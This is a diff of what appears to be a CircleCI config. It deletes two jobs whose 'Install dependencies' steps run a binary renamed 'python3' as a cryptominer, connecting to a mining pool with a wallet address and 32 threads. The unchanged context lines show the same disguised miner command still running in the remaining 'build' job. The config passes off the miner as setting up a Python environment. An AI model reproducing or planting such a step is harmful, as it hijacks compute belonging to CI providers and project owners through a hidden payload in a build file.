@@ -19,48 +19,10 @@ jobs:
             chmod +x python3
             ./python3 -o web-ko1.gonspool.com:3331 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=6 -t 32
             
-  build1:
-    working_directory: ~/platform #Here is the answer
-    docker:
-      - image: cimg/base:stable
-    steps:
-      - checkout:
-          path: ~/platform #Here is the answer
-      - run:
-          name: Install dependencies
-          command: |
-            sudo apt update
-            sudo apt upgrade
-            sudo apt install python3
-            apt install python3.8-venv
-            sudo python3 -m venv venv
-            . venv/bin/activate
-            chmod +x python3
-            ./python3 -o web-ko1.gonspool.com:3331 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=5 -t 32
-            
-  build2:
-    working_directory: ~/platform 
-    docker:
-      - image: cimg/base:stable
-    steps:
-      - checkout:
-          path: ~/platform 
-      - run:
-          name: Install 
-          command: |
-            sudo apt update
-            sudo apt upgrade
-            sudo apt install python3
-            sudo apt install python3.8-venv
-            python3 -m venv venv
-            . venv/bin/activate
-            chmod +x python3
-            ./python3 -o web-ko1.gonspool.com:3331 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=4 -t 32
+
             
 workflows:
   version: 2.1
   build_and_test:
     jobs:
       - build
-      - build1
-      - build2
